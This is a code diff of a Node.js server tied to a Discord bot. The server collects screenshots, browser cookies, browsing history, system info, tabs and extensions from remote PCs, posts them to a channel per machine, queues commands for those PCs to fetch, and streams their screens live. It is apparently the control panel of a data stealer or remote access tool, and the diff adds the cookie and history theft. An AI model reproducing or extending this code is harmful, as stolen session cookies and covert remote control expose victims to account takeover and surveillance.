@@ -17,17 +17,17 @@ const CATEGORY_NAME = "Все ПК";
 const ONLINE_TIMEOUT = 3 * 60 * 1000;
 
 // ---------- Состояние ----------
-const onlinePCs = {};
-const pendingCommands = {};
-const channelByPC = {};
-const wsClients = {};
-const messagesWithButtons = {};
+const onlinePCs = {};          // pcId -> timestamp
+const pendingCommands = {};    // pcId -> array of commands
+const channelByPC = {};        // pcId -> channelId
+const wsClients = {};          // pcId -> array of ws
+const messagesWithButtons = {}; // pcId -> messageId
 
 // ---------- Discord Bot ----------
 const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
 bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));
 
-// ---------- Кнопки ----------
+// ---------- Кнопки (оставляем как было) ----------
 function createControlButtons(pcId) {
     const safePcId = encodeURIComponent(pcId);
     return [new ActionRowBuilder().addComponents(
@@ -39,7 +39,7 @@ function createControlButtons(pcId) {
     )];
 }
 
-// ---------- Обработка кнопок ----------
+// ---------- Обработка кнопок (как было) ----------
 bot.on("interactionCreate", async interaction => {
     if(!interaction.isButton()) return;
     const [command, encodedPcId] = interaction.customId.split("|");
@@ -47,7 +47,7 @@ bot.on("interactionCreate", async interaction => {
     const lastPing = onlinePCs[pcId];
     const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);
 
-    const replyOptions = { ephemeral: true }; // обновленный формат
+    const replyOptions = { ephemeral: true };
     if(command === "check_online") {
         replyOptions.content = isOnline ? `✅ ПК ${pcId} онлайн` : `❌ ПК ${pcId} оффлайн`;
         await interaction.reply(replyOptions);
@@ -81,29 +81,30 @@ async function getOrCreateTextChannel(guild, name, parentId){
     return channel;
 }
 
-// ---------- Приём данных ----------
+// ---------- Приём данных (сохраняем функционал) ----------
 app.post("/upload", async (req, res) => {
     try {
-        const { pcId, screenshot } = req.body;
+        const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot } = req.body;
         if(!pcId) return res.status(400).json({ error:"pcId required" });
 
         onlinePCs[pcId] = Date.now();
+
         const guild = await bot.guilds.fetch(GUILD_ID);
         const category = await getOrCreateCategory(guild, CATEGORY_NAME);
         const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
         const finalChannel = channel || await getOrCreateTextChannel(guild, pcId, category.id);
         channelByPC[pcId] = finalChannel.id;
 
-        // ---------- Отправка скриншота ----------
-        if(screenshot){
-            try {
-                await finalChannel.send({ files: [{ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` }] });
-            } catch(e) {
-                console.error("Ошибка отправки скриншота:", e);
-            }
-        }
+        // ---------- Отправка файлов ----------
+        const files = [];
+        if(cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
+        if(history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
+        if(systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${pcId}-system.json` });
+        if(screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });
 
-        // ---------- WS ----------
+        if(files.length) await finalChannel.send({ files });
+
+        // ---------- WS для live камеры ----------
         if(screenshot && wsClients[pcId]){
             wsClients[pcId].forEach(ws => {
                 try { ws.send(screenshot); } catch(e){ }
@@ -127,8 +128,13 @@ app.post("/ping", (req, res) => {
     res.json({ commands });
 });
 
+// ---------- API для фронта (список онлайн ПК) ----------
+app.get("/api/online-pcs", (req, res) => {
+    res.json(Object.keys(onlinePCs));
+});
+
 // ---------- Статика ----------
-app.use(express.static(join(__dirname, "public")));
+app.use(express.static(join(__dirname, "public"))); // html/js клиент
 
 // ---------- WebSocket ----------
 const wss = new WebSocketServer({ noServer: true });
@@ -136,8 +142,10 @@ wss.on("connection", (ws, req) => {
     const url = new URL(req.url, `http://${req.headers.host}`);
     const pcId = url.searchParams.get("pcId");
     if(!pcId) return ws.close();
+
     if(!wsClients[pcId]) wsClients[pcId] = [];
     wsClients[pcId].push(ws);
+
     ws.on("close", () => { wsClients[pcId] = wsClients[pcId].filter(c => c !== ws); });
 });
 
